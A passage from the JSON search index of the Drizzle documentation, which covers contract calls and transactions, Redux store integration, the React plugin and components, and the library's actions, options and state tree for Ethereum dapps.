\"0x066408929e8d5Ed161e9cAA1876b60e1fBB5DB75\" , web3Contract : new web3 . eth . Contract ( /* ... */ ) } events = [ 'Mint' ] // Using an action dispatch ({ type : 'ADD_CONTRACT' , contractConfig , events }) // Or using the Drizzle context object this . context . drizzle . addContract ( contractConfig , events ) Removing Contracts Dynamically \u00b6 You can also delete contracts using either drizzle.deleteContract() or the DELETE_CONTRACT action. const contractName = \"MyContract\" // Using an action dispatch ({ type : 'DELETE_CONTRACT' , contractName }) // Or using the Drizzle context object this . context . drizzle . deleteContract ( contractName )","title":"Drizzle | Contract Interaction"},{"location":"docs/drizzle/getting-started/contract-interaction.html#contract-interaction","text":"Drizzle provides helpful methods on top of the default web3.Contract methods to keep your calls and transactions in sync with the store.","title":"Contract Interaction"},{"location":"docs/drizzle/getting-started/contract-interaction.html#cachecall","text":"Gets contract data. Calling the cacheCall() function on a contract will execute the desired call and return a corresponding key so the data can be retrieved from the store. When a new block is received, Drizzle will refresh the store automatically if any transactions in the block touched our contract. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this call to be cached and synchronized. We'll receive the store key for recall. const dataKey = drizzle . contracts . SimpleStorage . methods . storedData . cacheCall () // Use the dataKey to display data from the store. return state . contracts . SimpleStorage . storedData [ dataKey ]. value } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' The contract instance has all of its standard web3 properties and methods. For example, you could still call as normal if you don't want something in the store: drizzle . contracts . SimpleStorage . methods . storedData (). call ()","title":"cacheCall()"},{"location":"docs/drizzle/getting-started/contract-interaction.html#cachesend","text":"Sends a contract transaction. Calling the cacheSend() function on a contract will send the desired transaction and return a corresponding transaction hash so the status can be retrieved from the store. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. Drizzle will update the transaction's state in the store (pending, success, error) and store the transaction receipt. For more information on how this works, see How Data Stays Fresh . Note: We have to check that Drizzle is initialized before fetching data. A simple if statement such as below is fine for displaying a few pieces of data, but a better approach for larger dapps is to use a loading component . We've already built one for you in our drizzle-react-components library as well. // Assuming we're observing the store for changes. var state = drizzle . store . getState () // If Drizzle is initialized (and therefore web3, accounts and contracts), continue. if ( state . drizzleStatus . initialized ) { // Declare this transaction to be observed. We'll receive the stackId for reference. const stackId = drizzle . contracts . SimpleStorage . methods . set . cacheSend ( 2 , { from : '0x3f...' }) // Use the stackId to display the transaction status. if ( state . transactionStack [ stackId ]) { const txHash = state . transactionStack [ stackId ] return state . transactions [ txHash ]. status } } // If Drizzle isn't initialized, display some loading indication. return 'Loading...' For more information on what's contained in transaction state, see Drizzle State . The contract instance has all of its standard web3 properties and methods. For example, you could still send as normal if you don't want a tx in the store: drizzle . contracts . SimpleStorage . methods . set ( 2 ). send ({ from : '0x3f...' })","title":"cacheSend()"},{"location":"docs/drizzle/getting-started/contract-interaction.html#adding-contracts-dynamically","text":"You can programmatically add contracts to Drizzle using either drizzle.addContract() or the ADD_CONTRACT action. var contractConfig = { contractName : \"0x066408929e8d5Ed161e9cAA1876b60e1fBB5DB75\" , web3Contract : new web3 . eth . Contract ( /* ... */ ) } events = [ 'Mint' ] // Using an action dispatch ({ type : 'ADD_CONTRACT' , contractConfig , events }) // Or using the Drizzle context object this . context . drizzle . addContract ( contractConfig , events )","title":"Adding Contracts Dynamically"},{"location":"docs/drizzle/getting-started/contract-interaction.html#removing-contracts-dynamically","text":"You can also delete contracts using either drizzle.deleteContract() or the DELETE_CONTRACT action. const contractName = \"MyContract\" // Using an action dispatch ({ type : 'DELETE_CONTRACT' , contractName }) // Or using the Drizzle context object this . context . drizzle . deleteContract ( contractName )","title":"Removing Contracts Dynamically"},{"location":"docs/drizzle/getting-started/using-drizzles-redux-store.html","text":"Using Drizzle's Redux Store \u00b6 For those times when you don't want to manage your own Redux store, Drizzle has you covered. You can pass your Redux sagas, reducers, middleware and drizzleOptions to generateStore and drizzle will incorporate them in its own Redux Store. For an example use case see the Drizzle and Contract Events guide. Add Middleware to the Store \u00b6 Drizzle allows you to add redux middleware to it's redux instance. This gives you the ability to react to specific events in a meaningful way, outside of data synchronization. For example, you may want to interact with an external service whenever a contract event occurs. Import the drizzle dependencies. import { generateStore , EventActions } from 'drizzle' import drizzleOptions from '../drizzleOptions' Create a custom middleware. For more information on creating middleware for Redux, see the Redux middleware documentation . const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const contractMessage = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ contractMessage } ` // interact with your service console . log ( 'Contract event fired' , display ) } return next ( action ) } Create the store passing your Middlewares. const appMiddlewares = [ contractEventNotifier ] // create the store export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! }) Add Reducers and Sagas to the Store \u00b6 Drizzle gives you the option to add your reducers to its Redux store if you choose to use one store for your project. Import the drizzle dependencies. import { put , takeEvery } from 'redux-saga/effects' import { generateStore } from 'drizzle' import drizzleOptions from '../drizzleOptions' Define actions, reducers and sagas // actions const TODOS_FETCH = 'MY_APP/TODOS_FETCH' const TODOS_RECEIVED = 'MY_APP/TODOS_RECEIVED' // reducers const todosReducer = ( state = [], action ) => { if ( action . type === TODOS_RECEIVED ) { // update your state return action . todos } return state } // fetch data from service using sagas function * fetchTodos () { const todos = yield fetch ( 'https://jsonplaceholder.typicode.com/todos' ) . then ( resp => response . json ()) yield put ({ type : TODOS_RECEIVED , todos }) } // Combine all your redux concerns // app root saga function * appRootSaga () { yield takeEvery ( TODOS_FETCH , fetchTodos ) } Create the store passing in reducers and sagas // app Reducers and Sagas const appReducers = { todos : todosReducer } const appSagas = [ appRootSaga ] const store = generateStore ({ drizzleOptions , appReducers , appSagas }) export default store","title":"Drizzle | Using Drizzle's Redux Store"},{"location":"docs/drizzle/getting-started/using-drizzles-redux-store.html#using-drizzles-redux-store","text":"For those times when you don't want to manage your own Redux store, Drizzle has you covered. You can pass your Redux sagas, reducers, middleware and drizzleOptions to generateStore and drizzle will incorporate them in its own Redux Store. For an example use case see the Drizzle and Contract Events guide.","title":"Using Drizzle's Redux Store"},{"location":"docs/drizzle/getting-started/using-drizzles-redux-store.html#add-middleware-to-the-store","text":"Drizzle allows you to add redux middleware to it's redux instance. This gives you the ability to react to specific events in a meaningful way, outside of data synchronization. For example, you may want to interact with an external service whenever a contract event occurs. Import the drizzle dependencies. import { generateStore , EventActions } from 'drizzle' import drizzleOptions from '../drizzleOptions' Create a custom middleware. For more information on creating middleware for Redux, see the Redux middleware documentation . const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const contractMessage = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ contractMessage } ` // interact with your service console . log ( 'Contract event fired' , display ) } return next ( action ) } Create the store passing your Middlewares. const appMiddlewares = [ contractEventNotifier ] // create the store export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! })","title":"Add Middleware to the Store"},{"location":"docs/drizzle/getting-started/using-drizzles-redux-store.html#add-reducers-and-sagas-to-the-store","text":"Drizzle gives you the option to add your reducers to its Redux store if you choose to use one store for your project. Import the drizzle dependencies. import { put , takeEvery } from 'redux-saga/effects' import { generateStore } from 'drizzle' import drizzleOptions from '../drizzleOptions' Define actions, reducers and sagas // actions const TODOS_FETCH = 'MY_APP/TODOS_FETCH' const TODOS_RECEIVED = 'MY_APP/TODOS_RECEIVED' // reducers const todosReducer = ( state = [], action ) => { if ( action . type === TODOS_RECEIVED ) { // update your state return action . todos } return state } // fetch data from service using sagas function * fetchTodos () { const todos = yield fetch ( 'https://jsonplaceholder.typicode.com/todos' ) . then ( resp => response . json ()) yield put ({ type : TODOS_RECEIVED , todos }) } // Combine all your redux concerns // app root saga function * appRootSaga () { yield takeEvery ( TODOS_FETCH , fetchTodos ) } Create the store passing in reducers and sagas // app Reducers and Sagas const appReducers = { todos : todosReducer } const appSagas = [ appRootSaga ] const store = generateStore ({ drizzleOptions , appReducers , appSagas }) export default store","title":"Add Reducers and Sagas to the Store"},{"location":"docs/drizzle/react/react-components.html","text":"Drizzle React Components \u00b6 A set of useful components for common UI elements. Installation \u00b6 Install Drizzle React Components via npm: npm install --save drizzle-react-components Note : You'll also need the drizzle-react package, if it isn't already installed. Components \u00b6 LoadingContainer \u00b6 This components wraps your entire app (but within the DrizzleProvider) and will show a loading screen until Drizzle, and therefore web3 and your contracts, are initialized. loadingComp (component) The component displayed while Drizzle intializes. errorComp (component) The component displayed if Drizzle initialization fails. ContractData \u00b6 contract (string, required) Name of the contract to call. method (string, required) Method of the contract to call. methodArgs (array) Arguments for the contract method call. EX: The address for an ERC20 balanceOf() function. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. hideIndicator (boolean) If true, hides the loading indicator during contract state updates. Useful for things like ERC20 token symbols which do not change. toUtf8 (boolean) Converts the return value to a UTF-8 string before display. toAscii (boolean) Converts the return value to an Ascii string before display. ContractForm \u00b6 contract (string, required) Name of the contract whose method will be the basis the form. method (string, required) Method whose inputs will be used to create corresponding form fields. sendArgs (object) An object specifying options for the transaction to be sent; namely: from , gasPrice , gas and value . Further explanataion of these parameters can be found here in the web3 documentation . labels (array) Custom labels; will follow ABI input ordering. Useful for friendlier names. For example \"_to\" becoming \"Recipient Address\".","title":"Drizzle | React Components"},{"location":"docs/drizzle/react/react-components.html#drizzle-react-components","text":"A set of useful components for common UI elements.","title":"Drizzle React Components"},{"location":"docs/drizzle/react/react-components.html#installation","text":"Install Drizzle React Components via npm: npm install --save drizzle-react-components Note : You'll also need the drizzle-react package, if it isn't already installed.","title":"Installation"},{"location":"docs/drizzle/react/react-components.html#components","text":"","title":"Components"},{"location":"docs/drizzle/react/react-components.html#loadingcontainer","text":"This components wraps your entire app (but within the DrizzleProvider) and will show a loading screen until Drizzle, and therefore web3 and your contracts, are initialized. loadingComp (component) The component displayed while Drizzle intializes. errorComp (component) The component displayed if Drizzle initialization fails.","title":"LoadingContainer"},{"location":"docs/drizzle/react/react-components.html#contractdata","text":"contract (string, required) Name of the contract to call. method (string, required) Method of the contract to call. methodArgs (array) Arguments for the contract method call. EX: The address for an ERC20 balanceOf() function. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. hideIndicator (boolean) If true, hides the loading indicator during contract state updates. Useful for things like ERC20 token symbols which do not change. toUtf8 (boolean) Converts the return value to a UTF-8 string before display. toAscii (boolean) Converts the return value to an Ascii string before display.","title":"ContractData"},{"location":"docs/drizzle/react/react-components.html#contractform","text":"contract (string, required) Name of the contract whose method will be the basis the form. method (string, required) Method whose inputs will be used to create corresponding form fields. sendArgs (object) An object specifying options for the transaction to be sent; namely: from , gasPrice , gas and value . Further explanataion of these parameters can be found here in the web3 documentation . labels (array) Custom labels; will follow ABI input ordering. Useful for friendlier names. For example \"_to\" becoming \"Recipient Address\".","title":"ContractForm"},{"location":"docs/drizzle/react/react-integration.html","text":"React Integration \u00b6 @drizzle/react-plugin is the official way to integrate Drizzle with your React dapp. Check out the Drizzle Truffle Box for a complete example or continue reading to create your own setup. Also, check out @drizzle/react-components for Drizzle's codebuilt react components . Installation \u00b6 Install Drizzle React-Plugin via npm: npm install @drizzle/react-plugin Note : @drizzle/react-plugin requires Requires React v16.3+ for the Context API. You'll also need the @drizzle/store package, if it isn't already installed. Getting Started \u00b6 Import the DrizzleContext provider. import { DrizzleContext } from '@drizzle/react-plugin' Create a drizzleOptions object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section of the Drizzle docs . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const drizzleOptions = { contracts : [ SimpleStorage , TutorialToken ], events : { SimpleStorage : [ \"StorageSet\" ], }, } Import Drizzle . import { Drizzle } from \"@drizzle/store\" ; Create a new drizzle instance with the drizzleOptions object. const drizzle = new Drizzle ( drizzleOptions ); Pass the drizzle object to the DrizzleContext.Provider component. < DrizzleContext . Provider drizzle = { drizzle } >< /DrizzleContext.Provider> Use DrizzleContext.Consumer to consume the drizzle context and pass drizzle and drizzleState to your component. Drizzle also provides codebuilt components via the @drizzle/react-components . Note : We have to check that Drizzle is initialized before fetching data. The initialized variable returns the drizzle store's initialization status. < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> Fetch contract data by accessing contracts via drizzle and drizzleState in props . For more information on how this works, see How Data Stays Fresh in the Drizzle docs . For more info on the drizzle state, see state tree docs. The example below utilizes drizzle's cacheCall feature, which caches and synchronizes the call with the store. For more information on cacheCall and also cacheSend , see Contract Interaction . // sample component import React from 'react' ; class CacheCallExample extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . SimpleStorage ; let dataKey = contract . methods [ \"storedData\" ]. cacheCall (); // declare this call to be cached and synchronized this . setState ({ dataKey }); } render () { const { SimpleStorage } = this . props . drizzleState . contracts ; const displayData = SimpleStorage . storedData [ this . state . dataKey ]; // if displayData (an object) exists, then we can display the value below return ( < p > Hi from Truffle ! Here is your storedData : { displayData && displayData . value } < /p> ) } } export default CacheCallExample Note : The contract instances have all the standard web3 properties and methods. drizzle . contracts . SimpleStorage . methods . set ( 5 ). send (); // sets SimpleStorage contract's storedData state variable to uint 5. drizzle . contracts . SimpleStorage . methods . storedData . call (); // gets the storedData value Example Code Snippet \u00b6 // App.js import React from \"react\" ; import { DrizzleContext } from \"@drizzle/react-plugin\" ; import { Drizzle } from \"@drizzle/store\" ; import SimpleStorage from \"./contracts/SimpleStorage.json\" ; import MyComponent from \"./MyComponent\" ; // Check out drizzle's react components at @drizzle/react-components const drizzleOptions = { contracts : [ SimpleStorage ], events : { SimpleStorage : [ \"StorageSet\" ], }, }; const drizzle = new Drizzle ( drizzleOptions ); const App = () => { return ( < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> ); } export default App ;","title":"Drizzle | React Integration"},{"location":"docs/drizzle/react/react-integration.html#react-integration","text":"@drizzle/react-plugin is the official way to integrate Drizzle with your React dapp. Check out the Drizzle Truffle Box for a complete example or continue reading to create your own setup. Also, check out @drizzle/react-components for Drizzle's codebuilt react components .","title":"React Integration"},{"location":"docs/drizzle/react/react-integration.html#installation","text":"Install Drizzle React-Plugin via npm: npm install @drizzle/react-plugin Note : @drizzle/react-plugin requires Requires React v16.3+ for the Context API. You'll also need the @drizzle/store package, if it isn't already installed.","title":"Installation"},{"location":"docs/drizzle/react/react-integration.html#getting-started","text":"Import the DrizzleContext provider. import { DrizzleContext } from '@drizzle/react-plugin' Create a drizzleOptions object and pass in the desired contract artifacts for Drizzle to instantiate. Other options are available, see the Options section of the Drizzle docs . // Import contracts import SimpleStorage from './../build/contracts/SimpleStorage.json' import TutorialToken from './../build/contracts/TutorialToken.json' const drizzleOptions = { contracts : [ SimpleStorage , TutorialToken ], events : { SimpleStorage : [ \"StorageSet\" ], }, } Import Drizzle . import { Drizzle } from \"@drizzle/store\" ; Create a new drizzle instance with the drizzleOptions object. const drizzle = new Drizzle ( drizzleOptions ); Pass the drizzle object to the DrizzleContext.Provider component. < DrizzleContext . Provider drizzle = { drizzle } >< /DrizzleContext.Provider> Use DrizzleContext.Consumer to consume the drizzle context and pass drizzle and drizzleState to your component. Drizzle also provides codebuilt components via the @drizzle/react-components . Note : We have to check that Drizzle is initialized before fetching data. The initialized variable returns the drizzle store's initialization status. < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> Fetch contract data by accessing contracts via drizzle and drizzleState in props . For more information on how this works, see How Data Stays Fresh in the Drizzle docs . For more info on the drizzle state, see state tree docs. The example below utilizes drizzle's cacheCall feature, which caches and synchronizes the call with the store. For more information on cacheCall and also cacheSend , see Contract Interaction . // sample component import React from 'react' ; class CacheCallExample extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . SimpleStorage ; let dataKey = contract . methods [ \"storedData\" ]. cacheCall (); // declare this call to be cached and synchronized this . setState ({ dataKey }); } render () { const { SimpleStorage } = this . props . drizzleState . contracts ; const displayData = SimpleStorage . storedData [ this . state . dataKey ]; // if displayData (an object) exists, then we can display the value below return ( < p > Hi from Truffle ! Here is your storedData : { displayData && displayData . value } < /p> ) } } export default CacheCallExample Note : The contract instances have all the standard web3 properties and methods. drizzle . contracts . SimpleStorage . methods . set ( 5 ). send (); // sets SimpleStorage contract's storedData state variable to uint 5. drizzle . contracts . SimpleStorage . methods . storedData . call (); // gets the storedData value","title":"Getting Started"},{"location":"docs/drizzle/react/react-integration.html#example-code-snippet","text":"// App.js import React from \"react\" ; import { DrizzleContext } from \"@drizzle/react-plugin\" ; import { Drizzle } from \"@drizzle/store\" ; import SimpleStorage from \"./contracts/SimpleStorage.json\" ; import MyComponent from \"./MyComponent\" ; // Check out drizzle's react components at @drizzle/react-components const drizzleOptions = { contracts : [ SimpleStorage ], events : { SimpleStorage : [ \"StorageSet\" ], }, }; const drizzle = new Drizzle ( drizzleOptions ); const App = () => { return ( < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> ); } export default App ;","title":"Example Code Snippet"},{"location":"docs/drizzle/reference/drizzle-actions.html","text":"Drizzle Actions \u00b6 Drizzle emits many different actions that we can hook into with Middlewares. For more information about writing middlewares for Drizzle, see the Drizzle and Contract Events tutorial . The main categories of actions pertain to: * Accounts * Blocks * Drizzle * Contract Events * Transactions Accounts \u00b6 ACCOUNTS_FETCHING \u00b6 Fired when Drizzle begins fetching accounts. ACCOUNTS_FETCHED \u00b6 Fired once Drizzle has successfully fetched accounts. { accounts } accounts (array) : An array of account addresses. ACCOUNT_BALANCE_FETCHED \u00b6 Fired when an account balance has been successfully fetched. { address: balance } balance (int) : The account balance, indexed by account address (string) in gwei. ACCOUNTS_POLLING \u00b6 Fired when Drizzle begins polling for account changes. Blocks \u00b6 BLOCK_PROCESSING \u00b6 { block } block (object) : The block object returned by web3. See the web3 getBlock documentation for the block object's structure. Drizzle \u00b6 DRIZZLE_INITIALIZED \u00b6 Fire when drizzle has finished initializing. Once this has fired, web3 and accounts have been intialized. Contract Events \u00b6 EVENT_FIRED \u00b6 Fired when a contract event has been fired. { name, event } name (string) : The name of the event. event (object) : The event object returned by web3. See the web3 Contract Event documentation for the event object's structure. Transactions \u00b6 TX_BROADCASTED \u00b6 { txHash, stackId } txHash (string) : The transaction hash. stackId (int) : An integer representing an index in the transactionStack . TX_CONFIRMATION \u00b6 { confirmationReceipt, txHash } confirmationReceipt (object) : The confirmation receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash. TX_SUCCESSFUL \u00b6 { receipt, txHash } receipt (object) : The transaction receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash. TX_ERROR \u00b6 { error, stackTempKey } error (object) : An error object, containig a message , if provided. Empty object if the transaction failed as a result of user rejection via their wallet. stackTempKey (string) : If the transaction experienced an erorr before broadcasting (such as a rejection), this key will be filled on the transactionStack rather than a transaction hash to prevent stack index collisions.","title":"Drizzle | Drizzle Actions"},{"location":"docs/drizzle/reference/drizzle-actions.html#drizzle-actions","text":"Drizzle emits many different actions that we can hook into with Middlewares. For more information about writing middlewares for Drizzle, see the Drizzle and Contract Events tutorial . The main categories of actions pertain to: * Accounts * Blocks * Drizzle * Contract Events * Transactions","title":"Drizzle Actions"},{"location":"docs/drizzle/reference/drizzle-actions.html#accounts","text":"","title":"Accounts"},{"location":"docs/drizzle/reference/drizzle-actions.html#accounts_fetching","text":"Fired when Drizzle begins fetching accounts.","title":"ACCOUNTS_FETCHING"},{"location":"docs/drizzle/reference/drizzle-actions.html#accounts_fetched","text":"Fired once Drizzle has successfully fetched accounts. { accounts } accounts (array) : An array of account addresses.","title":"ACCOUNTS_FETCHED"},{"location":"docs/drizzle/reference/drizzle-actions.html#account_balance_fetched","text":"Fired when an account balance has been successfully fetched. { address: balance } balance (int) : The account balance, indexed by account address (string) in gwei.","title":"ACCOUNT_BALANCE_FETCHED"},{"location":"docs/drizzle/reference/drizzle-actions.html#accounts_polling","text":"Fired when Drizzle begins polling for account changes.","title":"ACCOUNTS_POLLING"},{"location":"docs/drizzle/reference/drizzle-actions.html#blocks","text":"","title":"Blocks"},{"location":"docs/drizzle/reference/drizzle-actions.html#block_processing","text":"{ block } block (object) : The block object returned by web3. See the web3 getBlock documentation for the block object's structure.","title":"BLOCK_PROCESSING"},{"location":"docs/drizzle/reference/drizzle-actions.html#drizzle","text":"","title":"Drizzle"},{"location":"docs/drizzle/reference/drizzle-actions.html#drizzle_initialized","text":"Fire when drizzle has finished initializing. Once this has fired, web3 and accounts have been intialized.","title":"DRIZZLE_INITIALIZED"},{"location":"docs/drizzle/reference/drizzle-actions.html#contract-events","text":"","title":"Contract Events"},{"location":"docs/drizzle/reference/drizzle-actions.html#event_fired","text":"Fired when a contract event has been fired. { name, event } name (string) : The name of the event. event (object) : The event object returned by web3. See the web3 Contract Event documentation for the event object's structure.","title":"EVENT_FIRED"},{"location":"docs/drizzle/reference/drizzle-actions.html#transactions","text":"","title":"Transactions"},{"location":"docs/drizzle/reference/drizzle-actions.html#tx_broadcasted","text":"{ txHash, stackId } txHash (string) : The transaction hash. stackId (int) : An integer representing an index in the transactionStack .","title":"TX_BROADCASTED"},{"location":"docs/drizzle/reference/drizzle-actions.html#tx_confirmation","text":"{ confirmationReceipt, txHash } confirmationReceipt (object) : The confirmation receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash.","title":"TX_CONFIRMATION"},{"location":"docs/drizzle/reference/drizzle-actions.html#tx_successful","text":"{ receipt, txHash } receipt (object) : The transaction receipt returned by web3. See the web3 getTransactionReceipt documentation for the receipt object's structure. txHash (string) : The transaction hash.","title":"TX_SUCCESSFUL"},{"location":"docs/drizzle/reference/drizzle-actions.html#tx_error","text":"{ error, stackTempKey } error (object) : An error object, containig a message , if provided. Empty object if the transaction failed as a result of user rejection via their wallet. stackTempKey (string) : If the transaction experienced an erorr before broadcasting (such as a rejection), this key will be filled on the transactionStack rather than a transaction hash to prevent stack index collisions.","title":"TX_ERROR"},{"location":"docs/drizzle/reference/drizzle-options.html","text":"Drizzle Options \u00b6 { contracts , events : { contractName : [ eventName , { eventName , eventOptions } ] }, polls : { accounts : interval , blocks : interval }, syncAlways , web3 : { customProvider , fallback : { type url } } } contracts (array) \u00b6 An array of either contract artifact files or Web3 contract objects. The objects have a contractName and web3Contract key. i.e. contracts : [ truffleArtifact , // A regular Truffle contract artifact { contractName : 'RegisteredContract' , web3Contract : new web3 . eth . Contract ( abi , address , { data : 'deployedBytecode' }) // An instance of a Web3 contract } ] events (object) \u00b6 An object consisting of contract names each containing an array of strings of the event names we'd like to listen for and sync with the store. Furthermore, event names may be replaced with an object containing both eventName and eventOptions , where eventOptions field corresponds to the web3 Contract.events options . polls (object) \u00b6 An object containing key/value pairs denoting what is being polled and the interval (in ms). Possible polls are accounts and blocks. Accounts will poll for addresses and balances, blocks for new blocks. Default : { blocks: 3000 } syncAlways (boolean) \u00b6 If true , will replay all contract calls at every block. This is useful if your dapp uses a proxy contract which obfuscates your primary contract's address. By default Drizzle checks blocks to see if a transaction interacting with your contracts has occured. If so, it syncs that contract. Default : false web3 (object) \u00b6 Options regarding web3 instantiation. customProvider (object) \u00b6 A valid web3 provider object. For example, you may wish to programatically create a Ganache provider for testing: // Create a Ganache provider. const testingProvider = Ganache . provider ({ gasLimit : 7000000 }) const options = { web3 : { customProvider : testingProvider } } const drizzle = new Drizzle ( options ) fallback (object) \u00b6 An object consisting of the type and url of a fallback web3 provider. This is used if no injected provider, such as MetaMask or Mist, is detected. type (string): The type of the fallback web3 provider. Currently the only possibility is 'ws' (web socket). Default : 'ws' url (string): The full fallback web3 provider url. Default : 'ws://127.0.0.1:8545'","title":"Drizzle | Drizzle Options"},{"location":"docs/drizzle/reference/drizzle-options.html#drizzle-options","text":"{ contracts , events : { contractName : [ eventName , { eventName , eventOptions } ] }, polls : { accounts : interval , blocks : interval }, syncAlways , web3 : { customProvider , fallback : { type url } } }","title":"Drizzle Options"},{"location":"docs/drizzle/reference/drizzle-options.html#contracts-array","text":"An array of either contract artifact files or Web3 contract objects. The objects have a contractName and web3Contract key. i.e. contracts : [ truffleArtifact , // A regular Truffle contract artifact { contractName : 'RegisteredContract' , web3Contract : new web3 . eth . Contract ( abi , address , { data : 'deployedBytecode' }) // An instance of a Web3 contract } ]","title":"contracts (array)"},{"location":"docs/drizzle/reference/drizzle-options.html#events-object","text":"An object consisting of contract names each containing an array of strings of the event names we'd like to listen for and sync with the store. Furthermore, event names may be replaced with an object containing both eventName and eventOptions , where eventOptions field corresponds to the web3 Contract.events options .","title":"events (object)"},{"location":"docs/drizzle/reference/drizzle-options.html#polls-object","text":"An object containing key/value pairs denoting what is being polled and the interval (in ms). Possible polls are accounts and blocks. Accounts will poll for addresses and balances, blocks for new blocks. Default : { blocks: 3000 }","title":"polls (object)"},{"location":"docs/drizzle/reference/drizzle-options.html#syncalways-boolean","text":"If true , will replay all contract calls at every block. This is useful if your dapp uses a proxy contract which obfuscates your primary contract's address. By default Drizzle checks blocks to see if a transaction interacting with your contracts has occured. If so, it syncs that contract. Default : false","title":"syncAlways (boolean)"},{"location":"docs/drizzle/reference/drizzle-options.html#web3-object","text":"Options regarding web3 instantiation.","title":"web3 (object)"},{"location":"docs/drizzle/reference/drizzle-options.html#customprovider-object","text":"A valid web3 provider object. For example, you may wish to programatically create a Ganache provider for testing: // Create a Ganache provider. const testingProvider = Ganache . provider ({ gasLimit : 7000000 }) const options = { web3 : { customProvider : testingProvider } } const drizzle = new Drizzle ( options )","title":"customProvider (object)"},{"location":"docs/drizzle/reference/drizzle-options.html#fallback-object","text":"An object consisting of the type and url of a fallback web3 provider. This is used if no injected provider, such as MetaMask or Mist, is detected. type (string): The type of the fallback web3 provider. Currently the only possibility is 'ws' (web socket). Default : 'ws' url (string): The full fallback web3 provider url. Default : 'ws://127.0.0.1:8545'","title":"fallback (object)"},{"location":"docs/drizzle/reference/drizzle-state.html","text":"Drizzle State \u00b6 { accounts , accountBalances : { address } contracts : { contractName : { initialized , synced , events , callerFunctionName : { argsHash : { args , value } } } }, currentBlock , drizzleStatus : { initialized }, transactions : { txHash : { confirmations , error , receipt , status } }, transactionStack , web3 : { status } } accounts (array) \u00b6 An array of account addresses from web3 . accountBalances (object) \u00b6 An object whose keys are account addresses and values are account balances (in Wei). contracts (object) \u00b6 A series of contract state objects, indexed by the contract name as declared in its ABI. contractName (object) \u00b6 initialized (boolean): true once contract is fully instantiated. synced (boolean): false if contract state changes have occurred in a block and Drizzle is re-running its calls. events (array): An array of event objects. Drizzle will only listen for the events we declared in options. The contract's state also includes the state of each constant function called on the contract ( callerFunctionName ). The functions are indexed by name, and contain the outputs indexed by a hash of the arguments passed during the call ( argsHash ). If no arguments were passed, the hash is 0x0 . Drizzle reads from the store for you, so it should be unnecessary to touch this data cache manually. args (array): Arguments passed to function call. value (mixed): Value returned from function call. currentBlock (object) \u00b6 An object the latest block as an object resulting from web3.getBlock() . This is updated once the block is received from a subscription or fetched via polling, but before any processing takes place. drizzleStatus (object) \u00b6 An object containing information about the status of Drizzle. initialized (boolean): true once: * web3 is found or instantiated * Account addresses are stored in state * All contracts are instantiated initialized (boolean) \u00b6 false by default, becomes true once a web3 instance is found and the accounts and contracts are fetched. transactions (object) \u00b6 A series of transaction objects, indexed by transaction hash. txHash (object) \u00b6 confirmations (array): After the initial receipt, further confirmation receipts (up to the 24th). error (object): contains the returned error if any. receipt (object): contains the first transaction receipt received from a transaction's success event. status (string): true or false depending on transaction status * pending when the transaction has broadcasted successfully, but is not yet mined * success when a transaction receipt has been received (you may also wish to check for further confirmations) * error if any errors occurred after broadcasting For more in-depth information on the Ethereum transaction lifecycle, check out this great blog post . transactionStack (array) \u00b6 In cases where a user cancels a transaction or the transaction is malformed and unable to be broadcasted, it won't receive a hash. To keep track of these cases, a temporary ID will be added to this array and replaced with the transaction hash once broadcasted. The cacheSend() method will return a stackId , which will allow you get the temporary ID to observe this process for your own transaction status indicator UI. web3 (object) \u00b6 status (string): initializing , initialized and failed are possible options. Useful for triggering warnings if web3 fails to instantiate.","title":"Drizzle | Drizzle State"},{"location":"docs/drizzle/reference/drizzle-state.html#drizzle-state","text":"{ accounts , accountBalances : { address } 